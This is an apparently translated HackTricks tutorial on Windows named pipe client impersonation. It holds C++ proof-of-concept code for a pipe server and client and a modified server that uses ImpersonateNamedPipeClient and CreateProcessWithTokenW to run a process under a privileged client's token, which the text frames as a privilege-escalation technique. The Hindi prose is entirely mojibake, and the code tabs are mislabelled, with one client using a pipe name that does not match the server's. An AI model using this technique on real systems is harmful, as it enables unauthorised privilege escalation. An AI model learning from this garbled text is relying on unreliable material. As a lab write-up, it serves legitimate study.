# рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЕрдиреБрдХрд░рдг

## рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЕрдиреБрдХрд░рдг

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**

</details>

**рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдХреЙрдкреА рдХреА рдЧрдИ рд╣реИ** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## рдЕрд╡рд▓реЛрдХрди

`рдкрд╛рдЗрдк` рдПрдХ рд╕рд╛рдЭрд╛ рдореЗрдореЛрд░реА рдмреНрд▓реЙрдХ рд╣реИ рдЬрд┐рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рд╕рдВрдЪрд╛рд░ рдФрд░ рдбреЗрдЯрд╛ рд╡рд┐рдирд┐рдордп рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреА рд╣реИрдВред

`рдирд╛рдорд┐рдд рдкрд╛рдЗрдк` рдПрдХ Windows рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рд╣реИ рдЬреЛ рджреЛ рдЕрд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдПрдХ-рджреВрд╕рд░реЗ рдХреЗ рдмреАрдЪ рдбреЗрдЯрд╛ рд╡рд┐рдирд┐рдордп рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдпрджреНрдпрдкрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдиреЗрдЯрд╡рд░реНрдХреЛрдВ рдкрд░ рд╕реНрдерд┐рдд рд╣реЛрдВред рдпрд╣ рдХреНрд▓рд╛рдЗрдВрдЯ/рд╕рд░реНрд╡рд░ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрд╣реБрдд рд╣реА рд╕рдорд╛рди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░` рдФрд░ `рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ` рдЬреИрд╕реЗ рдзрд╛рд░рдгрд╛рдПрдБ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИрдВред

рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░ рдПрдХ рдкрд╣рд▓реЗ рд╕реЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдПрдХ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЙрд╕ рдкрд╛рдЗрдк рд╕реЗ рдЬреБрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдЬрд╛рдирддреЗ рд╣реБрдПред рдПрдХ рдмрд╛рд░ рдЬрдм рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдбреЗрдЯрд╛ рд╡рд┐рдирд┐рдордп рд╢реБрд░реВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рд▓реИрдм рдПрдХ рд╕рд░рд▓ PoC рдХреЛрдб рдХреЗ рд╕рд╛рде рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ рдЬреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:

* рдПрдХ single-threaded dumb рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░ рдмрдирд╛рдирд╛ рдЬреЛ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрдиреЗрдХреНрд╢рди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдЧрд╛
* рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░ рдХреЛ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдкрд░ рдПрдХ рд╕рд░рд▓ рд╕рдВрджреЗрд╢ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рддрд╛рдХрд┐ рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЙрд╕реЗ рдкрдврд╝ рд╕рдХреЗ

## рдХреЛрдб

рдиреАрдЪреЗ рд╕рд░реНрд╡рд░ рдФрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд▓рд┐рдП PoC рд╣реИ:
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

return 0;
}
```
{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME L"\\\\.\\pipe\\MyNamedPipe"

int main()
{
    HANDLE hPipe;
    DWORD dwBytesRead;
    char buffer[1024];

    // Connect to the named pipe
    hPipe = CreateFile(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printf("Failed to connect to the named pipe. Error code: %d\n", GetLastError());
        return 1;
    }

    // Read data from the named pipe
    if (ReadFile(hPipe, buffer, sizeof(buffer), &dwBytesRead, NULL))
    {
        printf("Received data from the named pipe: %s\n", buffer);
    }
    else
    {
        printf("Failed to read data from the named pipe. Error code: %d\n", GetLastError());
    }

    // Close the named pipe
    CloseHandle(hPipe);

    return 0;
}
```

{% endtab %}

{% tab title="namedPipeClient.cpp" %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
HANDLE clientPipe = NULL;
BOOL isPipeRead = true;
wchar_t message[MESSAGE_SIZE] = { 0 };
DWORD bytesRead = 0;

std::wcout << "Connecting to " << pipeName << std::endl;
clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

while (isPipeRead) {
isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
std::wcout << "Received message: " << message;
}

return 0;
}
```
{% endtab %}
{% endtabs %}

## рдирд┐рд╖реНрдкрд╛рджрди

рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░ рдФрд░ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЙрдореНрдореАрдж рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрд╛рдо рдХрд░ рд░рд╣реЗ рд╣реИрдВ:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдирд╛рдорд┐рдд рдкрд╛рдЗрдкреНрд╕ рд╕рдВрдЪрд╛рд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ SMB рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣рдорд╛рд░реЗ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк `mantvydas-first-pipe` рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реИрдВрдбрд▓ рдмрдирд╛рдП рд░рдЦрддреА рд╣реИ:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

рдЗрд╕реА рддрд░рд╣, рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдкрд╛рд╕ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреЗ рд▓рд┐рдП рдПрдХ рдЦреБрд▓рд╛ рд╣реБрдЖ рд╣реИрдВрдбрд▓ рд╣реИ:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

рд╣рдо рдкрд╛рд╡рд░рд╢реЗрд▓ рдХреЗ рд╕рд╛рде рдЕрдкрдиреА рдкрд╛рдЗрдк рднреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)

## рдЯреЛрдХрди рдЕрдиреБрдХрд░рдг

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░ рдХреЛ (рдкрд╛рдЗрдк рдмрдирд╛рдиреЗ рд╡рд╛рд▓реА рд╕рд░реНрд╡рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛) рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рдкрд╛рд╕ **`SeImpersonate`** рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
{% endhint %}

рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░ рдХреЛ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `ImpersonateNamedPipeClient` API рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░ рдХреЗ рд╡рд░реНрддрдорд╛рди рдзрд╛рдЧреЗ рдХрд╛ рдЯреЛрдХрди рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рдкрд░рд┐рд╡рд░реНрддрд┐рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

рд╣рдо рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░ рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдХреЛрдб рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ - рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рдВрд╢реЛрдзрди рд▓рд╛рдЗрди 25 рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВ:
```cpp
int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

std::wcout << "Impersonating the client..." << std::endl;
ImpersonateNamedPipeClient(serverPipe);
err = GetLastError();

STARTUPINFO	si = {};
wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
PROCESS_INFORMATION pi = {};
HANDLE threadToken = GetCurrentThreadToken();
CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

return 0;
}
```
рд╕рд░реНрд╡рд░ рдХреЛ рдЪрд▓рд╛рдиреЗ рдФрд░ рдЙрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░реА@рдЕрдкрд░рд╛рдз.local рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдХреЗ рддрд╣рдд рдЪрд▓рд╛рддреЗ рд╣реИрдВ, рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдирд╛рдорд┐рдд рд╕рд░реНрд╡рд░ рдкрд╛рдЗрдк рдХрд╛ рдореБрдЦреНрдп рдереНрд░реЗрдб рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ - рдЕрдкрд░рд╛рдз\рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░реА рдХреЗ рдЯреЛрдХрди рдХреЛ рдЕрд╕реНрд╕реБрдо рдХрд░рддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ PipeServer.exe рдЗрд╕реА рдХреЗ рддрд╣рдд ws01\рдордВрддреНрд╡реНрдпрджрд╛рд╕ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд▓рдЧрддрд╛ рд╣реИ?
